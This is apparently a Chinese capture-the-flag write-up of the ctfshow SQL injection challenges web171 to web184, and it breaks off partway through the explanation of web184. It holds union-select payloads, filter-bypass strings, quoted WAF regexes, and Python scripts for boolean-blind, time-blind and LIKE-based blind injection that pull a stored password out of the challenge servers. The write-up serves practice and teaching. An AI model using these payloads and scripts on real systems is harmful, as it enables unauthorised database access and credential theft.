<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 4--+	</span><br><span class="line">-1&#x27; union select 1,2,3--+</span><br><span class="line">-1&#x27; union select 1,2,database()--+</span><br><span class="line">-1&#x27; union select 1,2,(select group_concat(table_name)from information_schema.tables where table_schema=database())--+</span><br><span class="line">-1&#x27; union select 1,2,(select group_concat(column_name)from information_schema.columns where table_name=&#x27;ctfshow_user&#x27;)--+</span><br><span class="line">-1&#x27; union select 1,2,(select password from ctfshow_user where username = &#x27;flag&#x27;)--+</span><br></pre></td></tr></table></figure>

<p>查询语句这里不会对我们的联合注入造成影响，只是正常的查询不会返回带flag的数据</p>
<h3 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h3><p>多了个返回逻辑</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//检查结果是否有flag</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$row</span>-&gt;username!==<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>万能密码用不了，这里的话会对username为flag的数据进行过滤，正常打联合注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,2--+</span><br><span class="line">-1&#x27; union select 1,(select group_concat(table_name)from information_schema.tables where table_schema=database())--+</span><br><span class="line">-1&#x27; union select 1,(select group_concat(column_name)from information_schema.columns where table_name=&#x27;ctfshow_user2&#x27;)--+</span><br><span class="line">-1&#x27; union select 1,(select password from ctfshow_user2 where username = &#x27;flag&#x27;)--+</span><br></pre></td></tr></table></figure>

<p>这样可以打，不过如果是这样的话就不行了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,(select username,password from ctfshow_user2 where username = &#x27;flag&#x27;)--+</span><br></pre></td></tr></table></figure>

<p>因为查询的结果中有username为flag，上面的话是我们只是返回username为flag的password值，并不会碰到过滤，所以我们上面的语句才能查询到flag</p>
<h3 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h3><p>正常打联合注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,2,3--+</span><br><span class="line">-1&#x27; union select 1,2,database()--+</span><br><span class="line">-1&#x27; union select 1,2,(select group_concat(table_name)from information_schema.tables where table_schema=database())--+</span><br><span class="line">-1&#x27; union select 1,2,(select group_concat(column_name)from information_schema.columns where table_name=&#x27;ctfshow_user3&#x27;)--+</span><br><span class="line">-1&#x27; union select 1,2,(select password from ctfshow_user3 where username=&#x27;flag&#x27;)--+</span><br></pre></td></tr></table></figure>

<p>这里的话刚好flag是ctfshow开头的，所以不会被过滤掉，如果我们的flag是flag开头的话需要绕过，例如username是flag，我们可以用编码函数去绕过（使用hex或者使用reverse、to_base64等函数加密）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select id,hex(username),password from ctfshow_user3 where username=&#x27;flag&#x27;--+</span><br></pre></td></tr></table></figure>

<h3 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h3><p>增加过滤了数字，打盲注就行</p>
<p>看看正确回显和错误回显</p>
<p><img src="/../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250502125228340.png" alt="image-20250502125228340"></p>
<p><img src="/../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250502125237421.png" alt="image-20250502125237421"></p>
<p>拿脚本跑吧，这次用二分法去跑，刚好学一下写脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://49bd2539-814b-433b-ac46-2cee1327b9df.challenge.ctf.show/api/v4.php&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) //<span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#payload = f&quot;1&#x27; and if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)--+&quot;</span></span><br><span class="line">        <span class="comment">#payload = f&quot;1&#x27; and if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name=&#x27;ctfshow_user4&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)--+&quot;</span></span><br><span class="line">        payload = <span class="string">f&quot;1&#x27; and if(ascii(substr((select password from ctfshow_user4 where username=&#x27;flag&#x27;),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0)--+&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        r = requests.get(url+<span class="string">&quot;?id=&quot;</span>+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;admin&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h3><p>这下是完全没内容了，到打时间盲注了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and sleep(4)--+</span><br></pre></td></tr></table></figure>

<p>成功延迟</p>
<p><img src="/../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250502130617338.png" alt="image-20250502130617338"></p>
<p>那就打时间盲注吧</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://7a2710eb-ee46-496f-bf62-839bb89fdee0.challenge.ctf.show/api/v5.php&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#payload = f&quot;?id=1&#x27; and if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(4),0)--+&quot;</span></span><br><span class="line">        <span class="comment">#payload = f&quot;?id=1&#x27; and if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name=&#x27;ctfshow_user5&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(4),0)--+&quot;</span></span><br><span class="line">        payload = <span class="string">f&quot;?id=1&#x27; and if(ascii(substr((select password from ctfshow_user5 where username=&#x27;flag&#x27;),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(4),0)--+&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line">        start_time = time.time()</span><br><span class="line">        r = requests.get(url+payload)</span><br><span class="line">        request_time = time.time()-start_time</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> request_time &gt; <span class="number">4</span> :</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;成功延迟,ascii&gt;<span class="subst">&#123;mid&#125;</span>&quot;</span>)</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;未延迟,ascii&lt;=<span class="subst">&#123;mid&#125;</span>&quot;</span>)</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

<h2 id="过滤注入"><a href="#过滤注入" class="headerlink" title="过滤注入"></a>过滤注入</h2><h3 id="web176"><a href="#web176" class="headerlink" title="web176"></a>web176</h3><p>万能密码可以做</p>
<p>fuzz一下发现过滤了select</p>
<p><img src="/../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250502133426113.png" alt="image-20250502133426113"></p>
<p>在mysql中对大小写是不敏感的，只要waf没有对大小写限制就可以用大写去绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union Select 1,2,3--+</span><br><span class="line">-1&#x27; union Select 1,2,(Select group_concat(table_name)from information_schema.tables where table_schema=database())--+</span><br><span class="line">-1&#x27; union Select 1,2,(Select group_concat(column_name)from information_schema.columns where table_name=&#x27;ctfshow_user&#x27;)--+</span><br><span class="line">-1&#x27; union Select 1,2,password from ctfshow_user where username=&#x27;flag&#x27;--+</span><br></pre></td></tr></table></figure>

<h3 id="web177"><a href="#web177" class="headerlink" title="web177"></a>web177</h3><p>fuzz一下，过滤了空格和注释符<code>--+</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;/**/or/**/&#x27;1&#x27;=&#x27;1&#x27;%23</span><br></pre></td></tr></table></figure>

<h3 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178</h3><p>这次过滤了<code>*</code>，换编码去绕过就行</p>
<p><code>%09</code>绕过空格</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;%09or%09&#x27;1&#x27;=&#x27;1&#x27;%23</span><br></pre></td></tr></table></figure>

<h3 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179</h3><p><code>%09</code>被过滤了，<code>%0c</code>绕过空格</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;%0cor%0c&#x27;1&#x27;=&#x27;1&#x27;%23</span><br></pre></td></tr></table></figure>

<h3 id="web180"><a href="#web180" class="headerlink" title="web180"></a>web180</h3><p>刚好看到一个fuzz单个字符的脚本，尝试着写一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://5855f9fc-5b45-4d37-9ec0-4785fc6143c3.challenge.ctf.show/api&quot;</span></span><br><span class="line">target = re.<span class="built_in">compile</span>(<span class="string">&quot;admin&quot;</span>)</span><br><span class="line"></span><br><span class="line">right_chr = []</span><br><span class="line">waf_chr = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">    char = <span class="built_in">chr</span>(i)</span><br><span class="line">    payload = <span class="string">f&quot;?id=1&#x27;and&#x27;<span class="subst">&#123;char&#125;</span>&#x27;=&#x27;<span class="subst">&#123;char&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    r = requests.get(url+payload)</span><br><span class="line">    w = target.search(r.text)</span><br><span class="line">    <span class="keyword">if</span> w <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        right_chr.append((i,char))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        waf_chr.append((i,char))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;未被过滤的字符: &quot;</span>,right_chr)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;waf: &quot;</span>,waf_chr)</span><br></pre></td></tr></table></figure>

<p>fuzz的结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">未被过滤的字符:  [(33, &#x27;!&#x27;), (34, &#x27;&quot;&#x27;), (36, &#x27;$&#x27;), (37, &#x27;%&#x27;), (40, &#x27;(&#x27;), (41, &#x27;)&#x27;), (44, &#x27;,&#x27;), (45, &#x27;-&#x27;), (46, &#x27;.&#x27;), (47, &#x27;/&#x27;), (48, &#x27;0&#x27;), (49, &#x27;1&#x27;), (50, &#x27;2&#x27;), (51, &#x27;3&#x27;), (52, &#x27;4&#x27;), (53, &#x27;5&#x27;), (54, &#x27;6&#x27;), (55, &#x27;7&#x27;), (56, &#x27;8&#x27;), (57, &#x27;9&#x27;), (58, &#x27;:&#x27;), (59, &#x27;;&#x27;), (60, &#x27;&lt;&#x27;), (61, &#x27;=&#x27;), (62, &#x27;&gt;&#x27;), (63, &#x27;?&#x27;), (64, &#x27;@&#x27;), (65, &#x27;A&#x27;), (66, &#x27;B&#x27;), (67, &#x27;C&#x27;), (68, &#x27;D&#x27;), (69, &#x27;E&#x27;), (70, &#x27;F&#x27;), (71, &#x27;G&#x27;), (72, &#x27;H&#x27;), (73, &#x27;I&#x27;), (74, &#x27;J&#x27;), (75, &#x27;K&#x27;), (76, &#x27;L&#x27;), (77, &#x27;M&#x27;), (78, &#x27;N&#x27;), (79, &#x27;O&#x27;), (80, &#x27;P&#x27;), (81, &#x27;Q&#x27;), (82, &#x27;R&#x27;), (83, &#x27;S&#x27;), (84, &#x27;T&#x27;), (85, &#x27;U&#x27;), (86, &#x27;V&#x27;), (87, &#x27;W&#x27;), (88, &#x27;X&#x27;), (89, &#x27;Y&#x27;), (90, &#x27;Z&#x27;), (91, &#x27;[&#x27;), (93, &#x27;]&#x27;), (94, &#x27;^&#x27;), (95, &#x27;_&#x27;), (96, &#x27;`&#x27;), (97, &#x27;a&#x27;), (98, &#x27;b&#x27;), (99, &#x27;c&#x27;), (100, &#x27;d&#x27;), (101, &#x27;e&#x27;), (102, &#x27;f&#x27;), (103, &#x27;g&#x27;), (104, &#x27;h&#x27;), (105, &#x27;i&#x27;), (106, &#x27;j&#x27;), (107, &#x27;k&#x27;), (108, &#x27;l&#x27;), (109, &#x27;m&#x27;), (110, &#x27;n&#x27;), (111, &#x27;o&#x27;), (112, &#x27;p&#x27;), (113, &#x27;q&#x27;), (114, &#x27;r&#x27;), (115, &#x27;s&#x27;), (116, &#x27;t&#x27;), (117, &#x27;u&#x27;), (118, &#x27;v&#x27;), (119, &#x27;w&#x27;), (120, &#x27;x&#x27;), (121, &#x27;y&#x27;), (122, &#x27;z&#x27;), (123, &#x27;&#123;&#x27;), (124, &#x27;|&#x27;), (125, &#x27;&#125;&#x27;), (126, &#x27;~&#x27;)]</span><br><span class="line"></span><br><span class="line">waf:  [(32, &#x27; &#x27;), (35, &#x27;#&#x27;), (38, &#x27;&amp;&#x27;), (39, &quot;&#x27;&quot;), (42, &#x27;*&#x27;), (43, &#x27;+&#x27;), (92, &#x27;\\&#x27;)]</span><br></pre></td></tr></table></figure>

<p>这里的话还是过滤了空格的，并且也过滤了注释符号%23,试着去闭合单引号就行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;%0cunion%0cselect%0c&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3</span><br><span class="line">-1&#x27;%0cunion%0cselect%0c&#x27;1&#x27;,database(),&#x27;3</span><br><span class="line">-1&#x27;%0cunion%0cselect%0c&#x27;1&#x27;,(select%0cgroup_concat(table_name)from%0cinformation_schema.tables%0cwhere%0ctable_schema=database()),&#x27;3</span><br><span class="line">-1&#x27;%0cunion%0cselect%0c&#x27;1&#x27;,(select%0cgroup_concat(column_name)from%0cinformation_schema.columns%0cwhere%0ctable_name=&#x27;ctfshow_user&#x27;),&#x27;3</span><br><span class="line">-1&#x27;%0cunion%0cselect%0c&#x27;1&#x27;,(select%0cpassword%0cfrom%0cctfshow_user%0cwhere%0cusername=&#x27;flag&#x27;),&#x27;3</span><br></pre></td></tr></table></figure>

<p>这道题一开始还用limit语句限制了返回的内容，后面把1换成-1才看到回显</p>
<h3 id="web181"><a href="#web181" class="headerlink" title="web181"></a>web181</h3><p>#运算符优先级</p>
<p>这次waf给出来了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//对传入的参数进行了过滤</span><br><span class="line">  function waf($str)&#123;</span><br><span class="line">    return preg_match(&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i&#x27;, $str);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>完全过滤了空格的绕过方法和select关键字，然后可以用万能密码的一个变式去做</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;||username=&#x27;flag</span><br></pre></td></tr></table></figure>

<p>这里比较复杂，稍微写的详细一点，这个payload是为什么呢？</p>
<p>我们插入到查询语句中</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;select id,username,password from ctfshow_user where username !=&#x27;flag&#x27; and id = &#x27;-1&#x27;||username=&#x27;flag&#x27; limit 1;&quot;;</span><br></pre></td></tr></table></figure>

<p>然后我们看一下mysql运算符的优先级</p>
<p><img src="/../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250502143641687.png" alt="image-20250502143641687"></p>
<p>在查询语句中，因为AND的优先级高于OR，所以WHERE的表达式可以拆分为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(username != &#x27;flag&#x27; AND id = &#x27;-1&#x27;) || (username = &#x27;flag&#x27;)</span><br></pre></td></tr></table></figure>

<p><code>username != &#39;flag&#39; AND id = &#39;-1&#39;</code> 会被优先计算，然后与 <code>username = &#39;flag&#39;</code> 进行 <code>OR</code> 运算。</p>
<ul>
<li>如果 <code>username = &#39;flag&#39;</code> 为真，则整个条件为真，无论 <code>username != &#39;flag&#39; AND id = -1</code> 是否为真。</li>
<li>因此，如果表中存在 <code>username=&#39;flag&#39;</code> 的数据，这条查询一定会返回该数据。</li>
</ul>
<h3 id="web182"><a href="#web182" class="headerlink" title="web182"></a>web182</h3><p>这次多过滤了个flag，不过可以用like模糊匹配绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;||(username)like&#x27;fla_`或者是`-1&#x27;||(username)like&#x27;fla%</span><br></pre></td></tr></table></figure>

<p>关于like中的通配符</p>
<table>
<thead>
<tr>
<th><code>%</code></th>
<th>匹配零个或多个任意字符</th>
<th><code>&#39;a%&#39;</code> 匹配所有以a开头的字符串</th>
</tr>
</thead>
<tbody><tr>
<td><code>_</code></td>
<td>匹配单个任意字符</td>
<td><code>&#39;a_&#39;</code> 匹配所有以a开头的两个字符长度的字符串</td>
</tr>
</tbody></table>
<p>这里的话在学习MySQL的时候也学到过</p>
<h3 id="web183"><a href="#web183" class="headerlink" title="web183"></a>web183</h3><p>查询语句</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line">  <span class="variable">$sql</span> = <span class="string">&quot;select count(pass) from &quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;tableName&#x27;</span>].<span class="string">&quot;;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>返回逻辑</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>增加过滤了<code>=</code>，<code>or</code>，<code>and</code>等字符</p>
<p>这里的话出现了一个查询结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//返回用户表的记录总数</span><br><span class="line">      $user_count = 0;</span><br></pre></td></tr></table></figure>

<p>可以用like模糊匹配去做</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select count(pass) from (ctfshow_user)where(pass)like&#x27;ctfshow&#123;%&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>返回$user_count &#x3D; 1;</p>
<p>如果没匹配上的话就返回0，这样就可以写脚本去盲注了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://5d62f6db-f813-4b1e-a2be-b100259ff40d.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line"></span><br><span class="line">string = <span class="string">&quot;1234567890abcdefghijklmnopqrstuvwxyz-&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;ctfshow&#123;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> string:</span><br><span class="line">        payload = <span class="string">f&quot;(ctfshow_user)where(pass)like&#x27;<span class="subst">&#123;flag+j&#125;</span>%&#x27;&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;tableName&quot;</span> : payload</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 1;&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag +=j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> j == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure>

<h3 id="web184"><a href="#web184" class="headerlink" title="web184"></a>web184</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;|\&quot;|union|\`|sleep|benchmark/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>这道题把时间盲注的两个常用函数禁用了，我还想着上一题是不是可以用时间盲注去打来着但是没打出来</p>
<p>这里还禁用了where语句和一些逻辑运算符例如<code>&amp;&amp;</code>和<code>||</code>，上面的方法不能用了，可以打左右连接</p>
<p>ctfshow_user表一共有22行数据</p>
<p>写个payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tableName=ctfshow_user as a left join ctfshow_user as b on a.pass regexp(CONCAT(char(99),char(116),char(42)))</span><br></pre></td></tr></table></figure>

<p>这里的话将ctfshow_user表设为两个表，并通过on后面的条件连接起来，此时满足on连接条件的话会返回，为什么呢？</p>
<p>我们先在本地测试一下</p>
<p><img src="/../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/3ceb4d92bafbc3517de1403e654c983.png" alt="3ceb4d92bafbc3517de1403e654c983"></p>
<p>可以看到当on的条件不一样的时候返回的结果也不一样</p>
<table>
<thead>
<tr>
<th><code>a.username = &quot;man&quot;</code></th>
<th><strong>左表</strong></th>
<th>左表（a）的 <code>username</code> 必须等于 <code>&quot;man&quot;</code>，才会尝试匹配右表（b）的所有行。</th>
</tr>
</thead>
<tbody><tr>
<td><code>b.username = &quot;man&quot;</code></td>
<td><strong>右表</strong></td>
<td>右表（b）的 <code>username</code> 必须等于 <code>&quot;man&quot;</code>，才会被左表（a）的行匹配。</td>
</tr>
</tbody></table>
<p>所以回到刚刚的payload</p>
